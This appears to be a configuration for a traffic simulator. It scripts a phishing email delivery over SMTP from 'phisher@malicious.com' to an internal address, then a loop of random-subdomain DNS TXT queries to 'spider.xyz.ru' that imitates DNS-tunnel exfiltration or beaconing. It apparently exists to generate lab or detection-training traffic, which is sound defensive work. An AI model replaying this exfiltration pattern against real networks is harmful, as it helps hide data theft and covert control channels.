{
  "default":{
    "environment":{
      "client.ip": "192.168.1.43",
      "server.ip": "192.168.1.2"
    },
    "config": {
      "net.gateways": [
        "192.168.1.2/24"
      ]
    }
  }
}

{
  "client": "${client.ip}", 
  "server": "${server.ip}:25",
  "sequence": [
    ["tcp.recv", "text", [
        "220 SMTP Service Ready"
      ]
    ],
    ["sys.time.drift", 500],
    ["tcp.send", "text", [
        "HELO mail.cortex.lan"
      ]
    ],
    ["sys.time.drift", 500],
    ["tcp.recv", "text", [
        "250 SMTP Service"
      ]
    ],
    ["sys.time.drift", 500],
    ["tcp.send", "text", [
        "MAIL FROM:<phisher@malicious.com>"
      ]
    ],
    ["sys.time.drift", 500],
    ["tcp.recv", "text", [
        "250 OK"
      ]
    ],
    ["sys.time.drift", 500],
    ["tcp.send", "text", [
        "RCPT TO:<minoue@cortex.lan>"
      ]
    ],
    ["tcp.recv", "text", [
        "250 OK"
      ]
    ],
    ["sys.time.drift", 500],
    ["tcp.send", "text", [
        "DATA"
      ]
    ],
    ["sys.time.drift", 500],
    ["tcp.recv", "text", [
        "354 Start mail input; end with <CRLF>.<CRLF>"
      ]
    ],
    ["sys.time.drift", 500],
    ["tcp.send", "file", "health-check.eml"],
    ["tcp.send", "text", [
        "."
      ]
    ],
    ["sys.time.drift", 500],
    ["tcp.recv", "text", [
        "250 OK"
      ]
    ],
    ["sys.time.drift", 500],
    ["tcp.send", "text", [
        "QUIT"
      ]
    ],
    ["sys.time.drift", 500],
    ["tcp.recv", "text", [
        "221 OK"
      ]
    ],
    ["sys.time.drift", 500]
  ]
}

{
  "client": "${client.ip}", 
  "server": "${server.ip}:25",
  "sequence": [
    ["sys.time.drift", 10000]
  ]
}

{
  "client": "${client.ip}",
  "server": "${server.ip}:53",
  "sequence": [
    ["for.session",[0,900],"i",
      [
        ["dns.q.txt","${rand.lower_alnum(32)}.spider.xyz.ru","${rand.lower_alnum(120)}"],
        ["sys.time.drift", 1000]
      ]
    ]
  ]
}

